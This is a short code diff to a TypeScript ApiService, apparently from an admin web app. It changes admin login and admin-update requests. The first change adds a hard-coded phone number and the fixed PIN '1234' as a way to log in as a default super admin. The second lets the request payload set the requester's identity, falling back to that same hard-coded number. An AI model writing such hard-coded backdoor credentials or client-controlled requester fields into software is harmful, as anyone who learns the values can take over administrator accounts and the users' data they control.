@@ -586,7 +586,7 @@ export class ApiService {
           }
           return { success: true, admin: freshAdmin };
         }
-        if ((clean === '0798765485' || clean.endsWith('798765485')) && credential === '1234') {
+        if ((clean === '0722220165' || clean.endsWith('722220165') || clean === '0798765485') && credential === '1234') {
           const fallback = { ...this.defaultSuperAdmin };
           this.saveLocalAdmin(fallback);
           this.setActiveAdminPhone(fallback.phone);
@@ -1195,7 +1195,7 @@ export class ApiService {
     return this.request<any>('/api/admin/update-admin-full', {
       method: 'POST',
       body: JSON.stringify({
-        requesterPhone: this.activeAdminPhone,
+        requesterPhone: payload.requesterPhone || this.activeAdminPhone || '0722220165',
         ...payload
       })
     });
